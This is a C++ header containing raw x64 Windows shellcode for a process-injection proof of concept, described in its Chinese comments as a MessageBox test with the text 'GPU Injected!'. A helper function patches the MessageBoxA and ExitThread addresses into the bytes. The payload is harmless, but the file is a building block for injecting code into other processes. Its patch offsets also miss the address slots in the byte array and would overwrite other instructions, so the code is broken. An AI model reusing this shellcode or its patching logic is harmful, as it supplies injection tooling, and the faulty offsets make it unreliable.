#pragma once
#include <cstdint>

namespace Shellcode {

// 简单 MessageBox PoC shellcode，Target 端会在运行前动态修补 API 地址。
inline uint8_t messageBoxPayload[] = {
    0x48, 0x83, 0xEC, 0x28,
    0x48, 0x31, 0xC9,
    0x48, 0x8D, 0x15, 0x29, 0x00, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x1E, 0x00, 0x00, 0x00,
    0x4D, 0x31, 0xC9,
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0,
    0x48, 0x31, 0xC9,
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xD0,

    'P', 'O', 'C', 0x00,
    'G', 'P', 'U', ' ', 'I', 'n', 'j', 'e', 'c', 't', 'e', 'd', '!', 0x00
};

constexpr uint32_t messageBoxPayloadSize = sizeof(messageBoxPayload);

inline void patchAddresses(uint8_t* payload, void* messageBoxAddr, void* exitThreadAddr) {
    uint64_t msgBoxAddr = reinterpret_cast<uint64_t>(messageBoxAddr);
    // 将 MessageBoxA 绝对地址写回 shellcode 字节流（小端）。
    for (int i = 0; i < 8; i++) {
        payload[20 + i] = static_cast<uint8_t>((msgBoxAddr >> (i * 8)) & 0xFF);
    }

    uint64_t exitAddr = reinterpret_cast<uint64_t>(exitThreadAddr);
    // 同理写入 ExitThread，用于在执行结束时退出线程。
    for (int i = 0; i < 8; i++) {
        payload[31 + i] = static_cast<uint8_t>((exitAddr >> (i * 8)) & 0xFF);
    }
}

}
